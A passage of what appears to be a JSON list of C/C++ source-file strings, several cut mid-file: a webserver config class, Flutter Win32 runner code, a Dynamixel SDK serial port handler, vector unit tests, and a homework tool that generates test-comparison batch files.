rp;\n}\n\nvoid LocationConfig::setAlias(const std::string &a)\n{\n    alias = a;\n}\n\nvoid LocationConfig::addCgiPath(const std::string& interpreterPath)\n{\n    cgiPaths.push_back(interpreterPath);\n}\n\nvoid LocationConfig::addCgiExtension(const std::string& extension)\n{\n    cgiExtensions.push_back(extension);\n\n}\n\nstd::ostream& operator<<(std::ostream& os, const LocationConfig& config)\n{\n    os << \"\\tLocation Configuration:\" << std::endl;\n    os << \"\\tRoot: \" << config.root << std::endl;\n    os << \"\\tIndex: \" << config.index << std::endl;\n    return os;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*******************************************************************************\n* Copyright 2017 ROBOTIS CO., LTD.\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n*     http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*******************************************************************************/\n\n/* Author: zerom, Ryu Woon Jung (Leon) */\n\n#if defined(__linux__)\n\n#include <stdio.h>\n#include <fcntl.h>\n#include <string.h>\n#include <unistd.h>\n#include <termios.h>\n#include <time.h>\n#include <sys/time.h>\n#include <sys/ioctl.h>\n#include <linux/serial.h>\n\n#include \"port_handler_linux.h\"\n\n#define LATENCY_TIMER  16  // msec (USB latency timer)\n                           // You should adjust the latency timer value. From the version Ubuntu 16.04.2, the default latency timer of the usb serial is '16 msec'.\n                           // When you are going to use sync / bulk read, the latency timer should be loosen.\n                           // the lower latency timer value, the faster communication speed.\n\n                           // Note:\n                           // You can check its value by:\n                           // $ cat /sys/bus/usb-serial/devices/ttyUSB0/latency_timer\n                           //\n                           // If you think that the communication is too slow, type following after plugging the usb in to change the latency timer\n                           //\n                           // Method 1. Type following (you should do this everytime when the usb once was plugged out or the connection was dropped)\n                           // $ echo 1 | sudo tee /sys/bus/usb-serial/devices/ttyUSB0/latency_timer\n                           // $ cat /sys/bus/usb-serial/devices/ttyUSB0/latency_timer\n                           //\n                           // Method 2. If you want to set it as be done automatically, and don't want to do above everytime, make rules file in /etc/udev/rules.d/. For example,\n                           // $ echo ACTION==\\\"add\\\", SUBSYSTEM==\\\"usb-serial\\\", DRIVER==\\\"ftdi_sio\\\", ATTR{latency_timer}=\\\"1\\\" > 99-dynamixelsdk-usb.rules\n                           // $ sudo cp ./99-dynamixelsdk-usb.rules /etc/udev/rules.d/\n                           // $ sudo udevadm control --reload-rules\n                           // $ sudo udevadm trigger --action=add\n                           // $ cat /sys/bus/usb-serial/devices/ttyUSB0/latency_timer\n                           //\n                           // or if you have another good idea that can be an alternatives,\n                           // please give us advice via github issue https://github.com/ROBOTIS-GIT/DynamixelSDK/issues\n\nstruct termios2 {\n  tcflag_t c_iflag;       /* input mode flags */\n  tcflag_t c_oflag;       /* output mode flags */\n  tcflag_t c_cflag;       /* control mode flags */\n  tcflag_t c_lflag;       /* local mode flags */\n  cc_t c_line;            /* line discipline */\n  cc_t c_cc[19];          /* control characters */\n  speed_t c_ispeed;       /* input speed */\n  speed_t c_ospeed;       /* output speed */\n};\n\n#ifndef TCGETS2\n#define TCGETS2     _IOR('T', 0x2A, struct termios2)\n#endif\n#ifndef TCSETS2\n#define TCSETS2     _IOW('T', 0x2B, struct termios2)\n#endif\n#ifndef BOTHER\n#define BOTHER      0010000\n#endif\n\nusing namespace dynamixel;\n\nPortHandlerLinux::PortHandlerLinux(const char *port_name)\n  : socket_fd_(-1),\n    baudrate_(DEFAULT_BAUDRATE_),\n    packet_start_time_(0.0),\n    packet_timeout_(0.0),\n    tx_time_per_byte(0.0)\n{\n  is_using_ = false;\n  setPortName(port_name);\n}\n\nbool PortHandlerLinux::openPort()\n{\n  return setBaudRate(baudrate_);\n}\n\nvoid PortHandlerLinux::closePort()\n{\n  if(socket_fd_ != -1)\n    close(socket_fd_);\n  socket_fd_ = -1;\n}\n\nvoid PortHandlerLinux::clearPort()\n{\n  tcflush(socket_fd_, TCIFLUSH);\n}\n\nvoid PortHandlerLinux::setPortName(const char *port_name)\n{\n  strcpy(port_name_, port_name);\n}\n\nchar *PortHandlerLinux::getPortName()\n{\n  return port_name_;\n}\n\n// TODO: baud number ??\nbool PortHandlerLinux::setBaudRate(const int baudrate)\n{\n  int baud = getCFlagBaud(baudrate);\n\n  closePort();\n\n  if(baud <= 0)   // custom baudrate\n  {\n    setupPort(B38400);\n    baudrate_ = baudrate;\n    return setCustomBaudrate(baudrate);\n  }\n  else\n  {\n    baudrate_ = baudrate;\n    return setupPort(baud);\n  }\n}\n\nint PortHandlerLinux::getBaudRate()\n{\n  return baudrate_;\n}\n\nint PortHandlerLinux::getBytesAvailable()\n{\n  int bytes_available;\n  ioctl(socket_fd_, FIONREAD, &bytes_available);\n  return bytes_available;\n}\n\nint PortHandlerLinux::readPort(uint8_t *packet, int length)\n{\n ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <vector>\n\n#include \"tests_init.h\"\n\nusing namespace s21;\n\nTEST(S21VectorInitializeTest, Initialize1) {\n  vector<int> v;\n\n  EXPECT_EQ(v.size(), 0);\n  EXPECT_EQ(v.capacity(), 0);\n  EXPECT_EQ(v.data(), nullptr);\n}\n\nTEST(S21VectorInitializeTest, Initialize2) {\n  vector<double> v;\n\n  EXPECT_EQ(v.size(), 0);\n  EXPECT_EQ(v.capacity(), 0);\n  EXPECT_EQ(v.data(), nullptr);\n}\n\nTEST(S21VectorInitializeTest, Initialize3) {\n  vector<int> v(4);\n\n  EXPECT_EQ(v.size(), 4);\n  EXPECT_EQ(v.capacity(), 4);\n  EXPECT_NE(v.data(), nullptr);\n}\n\nTEST(S21VectorInitializeTest, Initialize4) {\n  vector<char> v(25);\n\n  EXPECT_EQ(v.size(), 25);\n  EXPECT_EQ(v.capacity(), 25);\n  EXPECT_NE(v.data(), nullptr);\n}\n\nTEST(S21VectorInitializeTest, Initialize5) {\n  vector<int> v({1, 2, 3});\n\n  EXPECT_EQ(v.size(), 3);\n  EXPECT_EQ(v.capacity(), 3);\n  EXPECT_NE(v.data(), nullptr);\n\n  EXPECT_EQ(v[0], 1);\n  EXPECT_EQ(v[1], 2);\n  EXPECT_EQ(v[2], 3);\n  EXPECT_THROW(v[3], std::out_of_range);\n}\n\nTEST(S21VectorInitializeTest, Initialize6) {\n  vector<char> v({'a', 'b', 'c', 'd', 'e', 'f'});\n\n  EXPECT_EQ(v.size(), 6);\n  EXPECT_EQ(v.capacity(), 6);\n  EXPECT_NE(v.data(), nullptr);\n\n  EXPECT_EQ(v[0], 'a');\n  EXPECT_EQ(v[1], 'b');\n  EXPECT_EQ(v[2], 'c');\n  EXPECT_EQ(v[3], 'd');\n  EXPECT_EQ(v[4], 'e');\n  EXPECT_EQ(v[5], 'f');\n}\n\nTEST(S21VectorInitializeTest, Initialize7) {\n  vector<int> v1({55});\n  vector<int> v2(v1);\n\n  EXPECT_EQ(v2.size(), 1);\n  EXPECT_EQ(v2.capacity(), 1);\n  EXPECT_NE(v2.data(), nullptr);\n\n  EXPECT_EQ(v2[0], 55);\n}\n\nTEST(S21VectorInitializeTest, Initialize8) {\n  vector<std::string> v1({\"Hello\", \"World\", \"!\"});\n  vector<std::string> v2(v1);\n\n  EXPECT_EQ(v2.size(), 3);\n  EXPECT_EQ(v2.capacity(), 3);\n  EXPECT_NE(v2.data(), nullptr);\n\n  EXPECT_EQ(v2[0], \"Hello\");\n  EXPECT_EQ(v2[1], \"World\");\n  EXPECT_EQ(v2[2], \"!\");\n}\n\nTEST(S21VectorInitializeTest, Initialize9) {\n  vector<long> v1({100, 200, 300, 400});\n  vector<long> v2(std::move(v1));\n\n  EXPECT_EQ(v2.size(), 4);\n  EXPECT_EQ(v2.capacity(), 4);\n  EXPECT_NE(v2.data(), nullptr);\n  EXPECT_EQ(v1.data(), nullptr);\n\n  EXPECT_EQ(v2[0], 100);\n  EXPECT_EQ(v2[1], 200);\n  EXPECT_EQ(v2[2], 300);\n  EXPECT_EQ(v2[3], 400);\n}\n\nTEST(S21VectorInitializeTest, Initialize10) {\n  vector<long> v1({100});\n  vector<long> v2 = std::move(v1);\n\n  EXPECT_EQ(v2.size(), 1);\n  EXPECT_EQ(v2.capacity(), 1);\n  EXPECT_NE(v2.data(), nullptr);\n  EXPECT_EQ(v1.data(), nullptr);\n\n  EXPECT_EQ(v2.at(0), 100);\n}\n\nTEST(S21VectorInitializeTest, Initialize11) {\n  vector<int> v({1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12});\n\n  EXPECT_EQ(v.size(), 12);\n  EXPECT_EQ(v.capacity(), 12);\n  EXPECT_NE(v.data(), nullptr);\n\n  EXPECT_EQ(v.front(), 1);\n  EXPECT_EQ(v.back(), 12);\n\n  EXPECT_EQ(*v.cbegin(), 1);\n  EXPECT_EQ(*(v.cend() - 1), 12);\n\n  int i = 0;\n  for (vector<int>::iterator it = v.begin(); it != v.end(); it++) {\n    EXPECT_EQ(*it, v[i]);\n    i++;\n  }\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <cstdio>\r\n#include <conio.h>\r\n#include <fstream>\r\n#include <string>\r\n#include \"txt-compare-tool.h\"\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    Readme();\r\n    /////////////////////////////////////////////////\u4ee5\u4e0b\u662f\u7528\u6237\u8f93\u5165\u90e8\u5206/////////////////////////////////////////////////////\r\n\r\n    int a = 0, b = 0, c = 0, r = 0, x = 0;     //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cc\u4e3a\u6d4b\u8bd5\u6570\u636e\u6570\uff0cr\u4e3a\u8bed\u8a00\u9009\u9879\u53c2\u6570\uff0cx\u4e3a\u8f93\u5165\u4e2d\u95f4\u53d8\u91cf;\r\n    bool d = 0, del = 0, dev = 0, autodata = 0;     //d\u4e3ademo\u533a\u5206\u9009\u9879\u53c2\u6570\uff0cdel\u4e3a\u5220\u9664\u9009\u9879\u53c2\u6570\uff0cdev\u4e3a\u7f16\u8bd1\u5668\u9009\u9879\u53c2\u6570\u3002autodata\u4e3a\u751f\u6210\u6570\u636e\u6a21\u677f\u9009\u9879\u53c2\u6570\r\n    string parameter = \"\";    //\u7528\u6237\u6307\u5b9a\u7684txt-compare.exe\u7684\u53c2\u6570\r\n\r\n    cout << \" \u2460\u8bf7\u8f93\u5165\u4f5c\u4e1a\u7ec4\u53f7\uff08\u4f8b\uff1a3-b8\u5219\u8f93\u5165\uff1a3\uff09\uff1a\" << endl;\r\n    cin >> x;\r\n    a = CheckCin(x,99);\r\n    system(\"cls\");\r\n    cout << \" \u2461\u8bf7\u8f93\u5165\u4f5c\u4e1a\u7f16\u53f7\uff08\u4f8b\uff1a3-b8\u5219\u8f93\u5165\uff1a8\uff09\uff1a\" << endl;\r\n    cin >> x;\r\n    b = CheckCin(x,99);\r\n    system(\"cls\");\r\n    cout << \" \u2462\u8bf7\u8f93\u5165\u6d4b\u8bd5\u6570\u636e\u603b\u6570[0,99]\uff1a\" << endl;\r\n    cin >> x;\r\n    c = CheckCin(x, 99);\r\n    system(\"cls\");\r\n\r\n    if (c != 0)\r\n    {\r\n        cout << \" \u662f\u5426\u9700\u8981\u751f\u6210\u6d4b\u8bd5\u6570\u636e\u6a21\u677f\uff08\u662f\u8f93\u51651\uff0c\u5426\u8f93\u51650\uff09\uff1a\" << endl;\r\n        x = _getch() - 48;\r\n        autodata = CheckCin(x, 1);\r\n        system(\"cls\");\r\n        if (autodata)\r\n        {\r\n            DataCreate(a, b, c);\r\n            system(\"pause\");\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    cout << \" \u2463\u662f\u5426\u53ea\u6709c++\u6216c\u7a0b\u5e8f\uff08\u4ec5c++\u8f93\u51651\uff0c\u4ec5c\u8f93\u51652\uff0c\u5426\u8f93\u51650\uff09\uff1a\" << endl;\r\n    x = _getch() - 48;\r\n    r = CheckCin(x, 2);\r\n    if (r ==0)\r\n    {\r\n        cout << \" \u662f\u5426\u9700\u8981\u533a\u5206demo\u548cdemo-c\uff08\u662f\u8f93\u51651\uff0c\u5426\u8f93\u51650\uff09\uff1a\" << endl;\r\n        x = _getch() - 48;\r\n        d = CheckCin(x, 1);\r\n    }\r\n    system(\"cls\");\r\n    cout << \" \u2464\u662f\u5426\u9700\u8981\u533a\u5206VS(\u9ed8\u8ba4\u4ec5vs)\u548cdev\uff08\u662f\u8f93\u51651\uff0c\u5426\u8f93\u51650\uff09:\" << endl;\r\n    x = _getch() - 48;\r\n    dev = CheckCin(x, 1);\r\n    system(\"cls\");\r\n    cout << \" \u2465\u662f\u5426\u9700\u8981\u6307\u5b9atxt-compare.exe\u7684\u53c2\u6570\uff08\u662f\u8f93\u51651\uff0c\u5426\u8f93\u51650\uff09\uff1a\" << endl;\r\n    x = _getch() - 48;\r\n    x = CheckCin(x, 1);\r\n    if (x == 1)\r\n    {\r\n        cout << \" \u8bf7\u5728\u4e00\u884c\u5185\u8f93\u5165\u60a8\u8981\u6307\u5b9a\u7684\u53c2\u6570(\u53c2\u6570\u5747\u9700\u5e26\u6709--)\" << endl;\r\n        cin.ignore();\r\n        getline(cin, parameter);\r\n    }\r\n    system(\"cls\");\r\n    cout << \" \u2466\u662f\u5426\u9700\u8981\u81ea\u52a8\u5220\u9664\u751f\u6210\u7684result\u6587\u4ef6\uff08\u662f\u8f93\u51651\uff0c\u5426\u8f93\u51650\uff09\uff1a\" << endl;\r\n    x = _getch() - 48;\r\n    del = CheckCin(x, 1);\r\n    system(\"cls\");\r\n    /////////////////////////////////////////////////\u4ee5\u4e0a\u662f\u7528\u6237\u8f93\u5165\u90e8\u5206/////////////////////////////////////////////////////\r\n    /////////////////////////////////////////////////\u4ee5\u4e0b\u662f\u8f93\u51fa\u90e8\u5206/////////////////////////////////////////////////////\r\n    cout << endl << \"\u5f00\u59cb\u8f93\u51fatxt\u6821\u9a8c\u6279\u5904\u7406\u6587\u4ef6\" << endl << endl;\r\n    string s = to_string(a) + \"-b\" + to_string(b) + \".bat\";\r\n    ofstream write;\r\n    write.open(s);\r\n\r\n    write << \"@echo off\" << endl;  //\u4ee5\u4e0b\u529f\u80fd\u662f\u6253\u5370 \u8fd0\u884c\u4f5c\u4e1aexe\u7684\u6307\u4ee4\r\n\r\n    write << createExeRunCommand(a, b, c, \"-demo\", \"\");   //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cc\u4e3a\u6570\u636e\u6570\uff0cn\u4e3aexe\u7a0b\u5e8f\u540e\u7f00\uff0cr\u4e3areslut\u540e\u7f00;\r\n                                             //\u6253\u5370\u8f93\u51fademo\u7684\u7ed3\u679c\u7684\u547d\u4ee4\r\n    if (d)               //\u5982\u679c\u533a\u5206demo\uff0c\u6253\u5370\u8f93\u51fademo-c\u7684\u7ed3\u679c\u7684\u547d\u4ee4\r\n        write << createExeRunCommand(a, b, c, \"-demo-c\", \"-c\");\r\n\r\n    if (r <= 1)\r\n    {\r\n        write << createExeRunCommand(a, b, c, \"-1\", \"1\");\r\n        if (dev)         //\u5982\u679c\u533a\u5206dev\uff0c\u6253\u5370\u8f93\u51fa1-dev.exe\u7684\u7ed3\u679c\u7684\u547d\u4ee4\r\n            write << createExeRunCommand(a, b, c, \"-1-dev\", \"1-dev\");\r\n    }\r\n    if (r != 1)\r\n    {\r\n        write << createExeRunCommand(a, b, c, \"-2\", \"2\");\r\n        if (dev)        //\u5982\u679c\u533a\u5206dev\uff0c\u6253\u5370\u8f93\u51fa2-dev.exe\u7684\u7ed3\u679c\u7684\u547d\u4ee4\r\n            write << createExeRunCommand(a, b, c, \"-2-dev\", \"2-dev\");\r\n    }\r\n\r\n    write << \"@echo on\" << endl; //\u4ee5\u4e0b\u529f\u80fd\u662f\u6253\u5370 \u5bf9\u6bd4\u7ed3\u679ctxt\u7684\u6307\u4ee4\r\n    \r\n    if (d)   //\u5982\u679c\u533a\u5206demo\r\n    {\r\n        if (r <= 1)\r\n        {\r\n            write << createTxtComparisonCommand(a, b, \"\", \"1\", parameter);   //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cr1\u4e3a\u7b2c\u4e00\u4e2atxt\u540e\u7f00\uff0cr2\u4e3a\u7b2c\u4e8c\u4e2atxt\u540e\u7f00;\r\n            if (dev)         \r\n                write << createTxtComparisonCommand(a, b, \"\", \"1-dev\", parameter);\r\n        }\r\n        if (r != 1)\r\n        {\r\n            write << createTxtComparisonCommand(a, b, \"-c\", \"2\", parameter);\r\n            if (dev)        \r\n                write << createTxtComparisonCommand(a, b, \"\", \"2-dev\", parameter);\r\n        } \r\n    }\r\n    else  //\u4e0d\u533a\u5206demo\r\n    {\r\n        if (r <= 1)\r\n        {\r\n            write << createTxtComparisonCommand(a, b, \"\", \"1\", parameter);\r\n            if (dev)\r\n                write << createTxtComparisonCommand(a, b, \"\", \"1-dev\", parameter);\r\n        }\r\n        if (r != 1)\r\n        {\r\n            write << createTxtComparisonCommand(a, b, \"\", \"2\", parameter);\r\n            if (dev)\r\n                write << createTxtComparisonCommand(a, b, \"\", \"2-dev\", parameter);\r\n        }\r\n    }\r\n\r\n    if (del)  //\u4ee5\u4e0b\u529f\u80fd\u662f\u6253\u5370 \u5220\u9664\u7ed3\u679ctxt\u6587\u6863\u7684\u6307\u4ee4\r\n    {\r\n        write << \"@echo off\" << endl;\r\n\r\n        write << createTxtDeleteCommand(a, b, \"\");   //a\u4e3a\u7ec4\u53f7\uff0cb\u4e3a\u5e8f\u53f7\uff0cr\u4e3atxt\u540e\u7f00\r\n        if (d)   //\u5982\u679c\u533a\u5206demo\r\n            write << createTxtDeleteCommand(a, b, \"-c\");\r\n\r\n        if (r <= 1)\r\n        {\r\n            write << createTxtDeleteCommand(a, b, \"1\");\r\n            if (dev)\r\n                write << createTxtDeleteCommand(a, b, \"1-dev\");\r\n        }\r\n        if (r != 1)\r\n        {\r\n            write << createTxtDeleteCommand(a, b, \"2\");\r\n            if (dev)\r\n                write << createTxtDeleteCommand(a, b, \"2-dev\");\r\n        }\r\n\r\n        cout << \"result\u6587\u4ef6\u5c06\u81ea\u52a8\u5220\u9664\" << endl << endl;\r\n    }\r\n    else\r\n        cout << \"\u8fd0\u884cbat\u6587\u4ef6\u540e\uff0c-re",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"online_shop_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
